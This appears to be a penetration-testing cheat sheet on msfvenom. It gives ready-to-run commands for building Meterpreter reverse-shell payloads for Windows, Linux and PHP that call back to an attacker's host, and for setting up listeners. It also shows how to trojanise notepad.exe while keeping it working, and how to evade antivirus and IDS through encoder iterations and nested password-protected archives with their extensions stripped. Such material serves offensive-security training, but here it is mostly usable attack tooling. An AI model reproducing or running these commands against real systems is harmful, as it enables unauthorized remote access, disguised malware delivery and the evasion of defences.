**msfvenom** is primarily used for generating payloads, which are pieces of code that can be delivered to a target system to exploit vulnerabilities or gain unauthorized access.

| Option        | Description                                                                  |
| ------------- | ---------------------------------------------------------------------------- |
| **`-p`**      | Specify the payload (e.g., `windows/meterpreter/reverse_tcp`).               |
| **`OPTIONS`** | Set parameters such as `LHOST` (attacker’s IP) and `LPORT` (listening port). |
| **`-f`**      | Define the output format (e.g., `exe`, `elf`, `raw`, etc.).                  |
| **`-o`**      | Optional flag to specify an output file.                                     |

```bash
msfvenom -p <payload> OPTIONS -f <format> -o <output_file>
```

####  Steps to Generate Payloads

1. **Choose a Payload**

List all available payloads:

```bash
msfvenom -l payloads
```

 2. **Set Options**

Most payloads require options like `LHOST` (attacker’s IP) and `LPORT` (listening port). For example:

```bash
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port>
```

 3. **Choose an Output Format**

List all available formats:

```bash
msfvenom -l formats
```

 4. **Generate and Save Payload**

Save the payload to a file:

```bash
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> -f <format> -o <output_file_name>
```

5. **Set Up the Listener in msfconsole**

```bash
msfconsole
use exploit/multi/handler
# Set the payload to match the one generated with msfvenom
set payload <payload_name>
set LHOST <your_kali_ip> 
set LPORT 4444
exploit
```

Alternatively, you can set up the listener with **Netcat**

```bash
nc -lvnp <PORT>
```

#### Examples

```bash
# Windows reverse shell
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
# Linux reverse shell
msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o reverse_shell.elf
# Linux ELF reverse shell
msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```


---

## Encoding payloads
Payload encoding is used to bypass security mechanisms like antivirus software and intrusion detection systems (IDS). Encoding obfuscates the payload by transforming it into a different format, making it harder for security tools to detect.

To encode a payload, use the `-e` flag to specify the encoder and `-i` to set the number of iterations. The more iterations are used, the harder it will be to detect the payload.

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e <encoder> -i <iterations> -f <format>
```

To check how easy it is to detect our payload, we can use the **msf-virustotal** tool, which uploads the generated file to VirusTotal and reports how many antivirus engines flag it.

```bash
msf-virustotal -k <VT_API_KEY> <payload_file>
```

- `<VT_API_KEY>` is your VirusTotal API key
- `<payload_file>` is the file you want to analyze

#### Common Encoders

|**Encoder**|**Description**|
|---|---|
|`x86/shikata_ga_nai`|A polymorphic XOR additive feedback encoder for x86 architecture.|
|`cmd/powershell_base64`|Encodes payloads into Base64 for PowerShell execution.|
|`x64/xor_dynamic`|XOR encoder for x64 payloads.|
|`php/base64`|Encodes PHP payloads in Base64.|
|`ruby/base64`|Encodes Ruby payloads in Base64.|
|`generic/none`|No encoding applied (default).|

---

## Injecting Payloads Into Windows Portable Executables
Injecting payloads into legitimate Windows Portable Executables (PEs) is a common technique used to deliver malicious code while masquerading as a benign application. 

- `-x`: Path to the legitimate executable to inject the payload into.
- `-k`: Retains the original functionality of the legitimate executable.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x notepad.exe -k -f exe -o notepad_infected.exe
```

--- 

## AV, Firewall and IDS/IPS Evasion

This example demonstrates **how to obfuscate a payload** in order to reduce detection by **antivirus software, firewalls, and IDS/IPS systems**.  
The technique combines **payload encoding** with **multi-layer archive obfuscation**.

---

### Payload Generation with Encoding

First, an encoded payload is generated using **msfvenom**.

- A Windows x86 Meterpreter reverse TCP payload is used.
    
- The `x86/shikata_ga_nai` encoder applies polymorphic encoding.
    
- Multiple iterations (`-i 5`) further obfuscate the payload, making signature-based detection more difficult.
    
- The payload is saved as a JavaScript file to potentially bypass basic file filtering.
    

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=10.10.14.2 LPORT=8080 \
-e x86/shikata_ga_nai -i 5 \
-a x86 --platform windows -o test.js
```


### Multi-Layer Archive Obfuscation

After generating the encoded payload, additional obfuscation is applied by **archiving the payload multiple times**.

#### First Archive

- The payload file (`test.js`) is compressed into a RAR archive.
    
- A **password is applied**, preventing antivirus engines from scanning its contents.
    
- The archive extension (`.rar`) is removed to hide the real file type and evade simple inspection.
    

```bash
rar a test.rar -p test.js
mv test.rar test
```

At this stage, the payload is already:

- Password-protected
    
- Hidden behind an extensionless file
    


#### Second Archive

- The previously archived file is compressed again into a second password-protected archive.
    
- The archive extension is removed once more.
    

```bash
rar a test2.rar -p test
mv test2.rar test2
```


The final file (`test2`) is:

- **Double-archived**
    
- **Password-protected**
    
- **Without any file extension**
    

This significantly reduces the chance of detection by automated **antivirus engines and IDS/IPS systems**, especially those relying on static analysis or shallow file inspection.
